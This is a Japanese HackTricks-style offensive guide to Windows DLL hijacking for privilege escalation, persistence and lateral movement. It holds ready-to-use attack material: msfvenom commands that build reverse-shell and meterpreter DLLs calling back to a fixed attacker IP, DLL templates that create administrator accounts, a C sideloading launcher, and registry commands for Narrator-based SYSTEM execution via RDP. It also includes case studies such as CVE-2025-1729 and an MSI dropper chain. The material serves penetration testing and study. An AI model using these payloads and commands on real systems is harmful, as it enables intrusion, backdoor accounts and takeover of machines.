# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## 基本情報

DLL Hijacking は、信頼されたアプリケーションに悪意のある DLL を読み込ませるよう操作することを指します。この用語は **DLL Spoofing, Injection, and Side-Loading** のような複数の戦術を含みます。主にコード実行や永続化の達成、そして稀に権限昇格のために利用されます。ここでは昇格に焦点を当てていますが、ハイジャック手法自体は目的にかかわらず一貫しています。

### 一般的な手法

DLL hijacking に用いられる手法はいくつかあり、各手法の有効性はアプリケーションの DLL 読み込み戦略に依存します:

1. **DLL Replacement**: 正規の DLL を悪意のあるものと入れ替える。元の DLL の機能を維持するために **DLL Proxying** を使うこともある。
2. **DLL Search Order Hijacking**: 悪意の DLL を正規のものよりも先に検索されるパスに置くことで、アプリケーションの検索順序を悪用する。
3. **Phantom DLL Hijacking**: アプリケーションが存在しない依存 DLL を探す状況を利用して、悪意の DLL を作成し読み込ませる。
4. **DLL Redirection**: `%PATH%` や `.exe.manifest` / `.exe.local` ファイルなどの検索パラメータを変更して、アプリケーションを悪意の DLL に向ける。
5. **WinSxS DLL Replacement**: WinSxS ディレクトリ内で正規の DLL を悪意の DLL に置き換える。DLL side-loading と関連することが多い。
6. **Relative Path DLL Hijacking**: コピーしたアプリケーションと同じユーザー管理下のディレクトリに悪意の DLL を配置する。Binary Proxy Execution 技術に似る。

## 欠落している Dll の検出

システム内で欠落している Dll を見つける最も一般的な方法は、sysinternals の [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) を実行し、次の 2 つのフィルタを設定することです:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

そして **File System Activity** のみを表示します:

![](<../../../images/image (153).png>)

一般的な **missing dlls** を探している場合は、これを数秒間そのまま実行しておきます。\
特定の実行ファイル内の **missing dll** を探している場合は、"Process Name" "contains" `<exec name>` のような別のフィルタを設定して、実行後にイベントのキャプチャを停止してください。

## Exploiting Missing Dlls

権限昇格を狙う最良のチャンスは、特権プロセスが読み込もうとする DLL を、プロセスが検索する場所のいずれかに書き込めることです。したがって、壊れたケースではオリジナル DLL のあるフォルダより前に検索されるフォルダに DLL を書き込むか、そもそもオリジナル DLL がどのフォルダにも存在しない場所に書き込めるか、のいずれかになります。

### Dll Search Order

**Inside the** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **you can find how the Dlls are loaded specifically.**

Windows アプリケーションは、あらかじめ定義された一連の検索パスを特定の順序で辿って DLL を探します。悪意のある DLL をこれらのディレクトリのいずれかに戦略的に配置すると、正規の DLL より先に読み込まれてしまう点が DLL hijacking の問題です。これを防ぐための解決策は、アプリケーションが必要な DLL を参照する際に絶対パスを使用することです。

32-bit システムにおける **DLL search order** は以下の通りです:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

これは **SafeDllSearchMode** が有効なときの **デフォルト** の検索順序です。無効にするとカレントディレクトリが第2位に上がります。この機能を無効化するには、HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\\SafeDllSearchMode のレジストリ値を作成し、0 に設定します（既定は有効）。

[**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) 関数が **LOAD_WITH_ALTERED_SEARCH_PATH** フラグで呼ばれた場合、検索は LoadLibraryEx が読み込もうとしている実行モジュールのディレクトリから開始されます。

最後に、DLL が名前だけではなく絶対パスで指定されて読み込まれる場合があることに注意してください。その場合、その DLL はそのパスでしか検索されません（その DLL に依存関係があれば、それらは名前で読み込まれたものとして検索されます）。

検索順序を変更する他の方法もありますが、ここでは説明しません。

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

新しく作成されるプロセスの DLL 検索パスを決定的に操作する高度な方法の一つは、ntdll のネイティブ API を使ってプロセスを作成するときに RTL_USER_PROCESS_PARAMETERS の DllPath フィールドを設定することです。ここに攻撃者が制御するディレクトリを指定すると、ターゲットプロセスが DLL を名前で解決する（絶対パスではなく、セーフロードフラグを使っていない）場合に、そのディレクトリから悪意の DLL を読み込ませることが可能になります。

キーアイデア
- RtlCreateProcessParametersEx でプロセスパラメータを構築し、カスタムの DllPath をあなたが制御するフォルダ（例: dropper/unpacker が存在するディレクトリ）に向ける。
- RtlCreateUserProcess でプロセスを作成する。ターゲットバイナリが DLL を名前で解決するとき、ローダはこの提供された DllPath を参照するため、悪意の DLL がターゲット EXE と同じ場所に置かれていなくても確実な sideloading が可能になる。

ノート/制限事項
- これは作成される子プロセスに影響し、現在のプロセスにのみ影響する SetDllDirectory とは異なる。
- ターゲットは名前で DLL を import するか LoadLibrary で読み込む必要がある（絶対パスでないこと、LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories を使っていないこと）。
- KnownDLLs やハードコーディングされた絶対パスはハイジャックできない。Forwarded exports や SxS は優先順位を変える可能性がある。

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

運用上の使用例
- 悪意ある xmllite.dll（必要な関数をエクスポートするか、実体にプロキシするもの）をあなたの DllPath ディレクトリに配置する。
- 上記の手法で名前により xmllite.dll を参照することが知られている署名済みバイナリを起動する。ローダは与えられた DllPath を介してインポートを解決し、あなたの DLL を sideload する。

この手法は実際の攻撃で multi-stage sideloading chains を駆動するために観測されています：初期のランチャーがヘルパー DLL をドロップし、それが Microsoft-signed で hijackable なバイナリをカスタム DllPath で起動して、攻撃者の DLL をステージングディレクトリから強制的に読み込ませる連鎖を形成します。


#### Windows ドキュメントによる DLL 検索順の例外

Windows ドキュメントでは標準の DLL 検索順に対するいくつかの例外が記載されています：

- 既にメモリに読み込まれているものと同じ名前を持つ **DLL** が見つかった場合、システムは通常の検索をバイパスします。代わりにリダイレクトとマニフェストのチェックを行い、それでもなければ既にメモリにある DLL を使用します。**このシナリオでは、システムは DLL の検索を実施しません**。
- DLL が現在の Windows バージョンに対して **known DLL** と認識される場合、システムはその known DLL のバージョンと、その依存 DLL を使用し、**検索プロセスを省略します**。これらの known DLL の一覧はレジストリキー **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** に格納されています。
- もし **DLL に依存関係がある** 場合、これらの依存 DLL の検索は、初期 DLL がフルパスで指定されていたかどうかに関わらず、あたかもそれらが **モジュール名のみで示されている** かのように行われます。

### 権限昇格

**要件**:

- **different privileges**（horizontal or lateral movement）で動作している、または動作するプロセスで、**DLL が欠落している** プロセスを特定すること。
- **DLL が検索される** 任意の **ディレクトリ** に対して **write access** があることを確認する。対象は実行ファイルのディレクトリやシステムパス内のディレクトリである可能性があります。

確かに要件は見つけにくく、**デフォルトでは特権を持つ実行ファイルが DLL を欠いている状況を見つけるのはかなり珍しい**ですし、**システムパスのフォルダに対して書き込み権限を持っていることはさらにありえない**（通常は不可能）ことです。しかし、ミスコンフィギュアされた環境ではこれは可能です。\
もし運良く要件を満たしている場合は、[UACME](https://github.com/hfiref0x/UACME) プロジェクトを確認すると良いでしょう。プロジェクトの **主な目的は UAC をバイパスすること** ですが、そこには使用可能な Windows バージョン向けの **PoC** の Dll hijaking が見つかるかもしれません（おそらく書き込み権限のあるフォルダのパスを変更するだけで済みます）。

フォルダ内の権限を**確認する**には、次のようにします：
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
そして **PATH内のすべてのフォルダの権限を確認する**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
次のコマンドで、executable の imports と dll の exports を確認できます:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
For a full guide on how to **abuse Dll Hijacking to escalate privileges** with permissions to write in a **System Path folder** check:


{{#ref}}
writable-sys-path-+dll-hijacking-privesc.md
{{#endref}}

### 自動化ツール

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)は system PATH 内の任意のフォルダに対して書き込み権限があるかを確認します。\
この脆弱性を発見するための他の有用な自動化ツールには **PowerSploit functions**:_Find-ProcessDLLHijack_、_Find-PathDLLHijack_、_Write-HijackDll_ があります。

### Example

もし悪用可能なシナリオを見つけた場合、成功させるために最も重要な点の一つは、実行ファイルがそこからインポートする少なくともすべての関数をエクスポートする **dll を作成すること** です。なお、Dll Hijacking は [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) や [**High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system) への昇格に便利であることに注意してください。  
実行向けの dll hijacking に焦点を当てたこの研究の中には、**how to create a valid dll** の例があります: [https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)。\
さらに、**次のセクション**ではテンプレートとして、または不要な関数をエクスポートした **dll を作成する** ために役立ついくつかの**基本的な dll コード**を掲載しています。

## **Creating and compiling Dlls**

### **Dll Proxifying**

基本的に **Dll proxy** は読み込まれたときに **悪意あるコードを実行できる** 一方で、実際のライブラリへのすべての呼び出しをリレーすることで、期待どおりに **公開** し **動作** する Dll です。

ツール [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) や [**Spartacus**](https://github.com/Accenture/Spartacus) を使うと、実行ファイルを指定してプロキシ化したいライブラリを選択し **proxified dll を生成** したり、Dll を指定して **proxified dll を生成** することができます。

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**meterpreter (x86) を取得する:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**ユーザーを作成する（x86、x64版は見当たりませんでした）:**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### 自分で作成する場合

いくつかのケースでは、コンパイルした Dll は victim process によってロードされるため、**export several functions** が必要です。これらの関数が存在しないと、**binary won't be able to load them** そして **exploit will fail**。

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>ユーザー作成を含む C++ DLL の例</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>スレッドエントリを持つ代替 C DLL</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## ケーススタディ: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

WindowsのNarrator.exeは起動時に、予測可能な言語固有のローカリゼーションDLLをプローブします。これをハイジャックすることで任意のコード実行と永続化が可能です。

Key facts
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- If a writable attacker-controlled DLL exists at the OneCore path, it is loaded and `DllMain(DLL_PROCESS_ATTACH)` executes. No exports are required.

Discovery with Procmon
- フィルタ: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Narratorを起動し、上記のパスのロード試行を監視します。

## 最小限の DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC の静けさ
- 単純な hijack は UI を読み上げ/ハイライトします。静かにするには、アタッチ時に Narrator のスレッドを列挙し、メインスレッドを開いて (`OpenThread(THREAD_SUSPEND_RESUME)`) `SuspendThread` で停止し、自分のスレッドで続行します。完全なコードは PoC を参照してください。

Trigger and persistence via Accessibility configuration
- ユーザーコンテキスト (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- 上記を設定すると、Narrator を起動した際に植え付けた DLL が読み込まれます。セキュアデスクトップ（ログオン画面）では CTRL+WIN+ENTER を押して Narrator を起動してください。

RDP-triggered SYSTEM execution (lateral movement)
- クラシックな RDP セキュリティレイヤーを許可: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- ホストに RDP 接続し、ログオン画面で CTRL+WIN+ENTER を押して Narrator を起動します。セキュアデスクトップ上であなたの DLL が SYSTEM として実行されます。
- RDP セッションが閉じると実行は停止します — 速やかに inject/migrate してください。

Bring Your Own Accessibility (BYOA)
- 組み込みの Accessibility Tool (AT) のレジストリエントリ（例: CursorIndicator）をクローンし、任意のバイナリ/DLL を指すように編集してインポートし、その後 `configuration` をその AT 名に設定できます。これにより Accessibility フレームワーク下で任意の実行がプロキシされます。

Notes
- `%windir%\System32` 以下への書き込みや HKLM 値の変更には管理者権限が必要です。
- すべてのペイロードロジックは `DLL_PROCESS_ATTACH` に置けます；エクスポートは不要です。

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

This case demonstrates **Phantom DLL Hijacking** in Lenovo's TrackPoint Quick Menu (`TPQMAssistant.exe`), tracked as **CVE-2025-1729**.

### 脆弱性の詳細

- **コンポーネント**: `TPQMAssistant.exe` は `C:\ProgramData\Lenovo\TPQM\Assistant\` にあります。
- **スケジュールタスク**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` は毎日 9:30 AM にログオン中のユーザーのコンテキストで実行されます。
- **ディレクトリの権限**: `CREATOR OWNER` によって書き込み可能で、ローカルユーザーが任意のファイルを配置できます。
- **DLL 検索の挙動**: まず作業ディレクトリから `hostfxr.dll` をロードしようとし、見つからない場合は "NAME NOT FOUND" とログに出力します。これはローカルディレクトリ検索の優先を示しています。

### エクスプロイトの実装

攻撃者は同じディレクトリに悪意ある `hostfxr.dll` スタブを配置し、欠落している DLL を悪用してユーザーのコンテキストでコード実行を達成できます:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### 攻撃フロー

1. 標準ユーザーとして、`hostfxr.dll` を `C:\ProgramData\Lenovo\TPQM\Assistant\` に配置する。
2. 現在のユーザーコンテキストでスケジュールされたタスクが午前9:30に実行されるのを待つ。
3. タスク実行時に管理者がログオンしていれば、悪意あるDLLは管理者のセッションでミディアムインテグリティで実行される。
4. 標準的な UAC バイパス手法を連鎖させて、ミディアムインテグリティから SYSTEM 権限へ昇格する。

## ケーススタディ：MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

攻撃者は信頼された署名済みプロセスの下でペイロードを実行するために、MSIベースのドロッパーとDLL side-loadingを組み合わせることが多い。

Chain overview
- ユーザーがMSIをダウンロードする。GUIインストール中にCustomActionがサイレントで実行され（例: LaunchApplication や VBScript アクション）、埋め込まれたリソースから次段を再構成する。
- ドロッパーは正当な署名済みのEXEと悪意あるDLLを同じディレクトリに書き込む（例: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll）。
- 署名済みEXEが起動されると、WindowsのDLL検索順により作業ディレクトリの wsc.dll が最初に読み込まれ、署名済みの親プロセスの下で攻撃者コードが実行される（ATT&CK T1574.001）。

MSI analysis (what to look for)
- CustomAction table:
- 実行可能ファイルやVBScriptを実行するエントリを探す。疑わしいパターンの例: LaunchApplication がバックグラウンドで埋め込みファイルを実行する。
- Orca (Microsoft Orca.exe) で CustomAction、InstallExecuteSequence、Binary テーブルを確認する。
- MSI CAB 内の埋め込み/分割ペイロード:
- 管理者抽出: msiexec /a package.msi /qb TARGETDIR=C:\out
- または lessmsi を使用: lessmsi x package.msi C:\out
- 複数の小さな断片があり、VBScript CustomAction によって連結・復号されるものを探す。一般的な流れ:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
wsc_proxy.exe を使った実践的な sideloading
- Drop these two files in the same folder:
- wsc_proxy.exe: 正当な署名済みホスト (Avast)。プロセスは自ディレクトリから名前で wsc.dll をロードしようとします。
- wsc.dll: 攻撃者の DLL。特定のエクスポートが不要であれば DllMain で十分です。そうでない場合は proxy DLL を作成し、必要なエクスポートを正規ライブラリにフォワードしつつ DllMain 内で payload を実行します。
- Build a minimal DLL payload:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- エクスポート要件に関しては、プロキシングフレームワーク（例: DLLirant/Spartacus）を使用して、payloadも実行するforwarding DLLを生成してください。

- この技術はホストバイナリによるDLL名解決に依存します。ホストが絶対パスや安全な読み込みフラグ（例: LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories）を使用している場合、hijackは失敗する可能性があります。
- KnownDLLs、SxS、および forwarded exports は優先度に影響を与える可能性があり、ホストバイナリおよびエクスポートセットの選定時に考慮する必要があります。

## 参考文献

- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)


{{#include ../../../banners/hacktricks-training.md}}
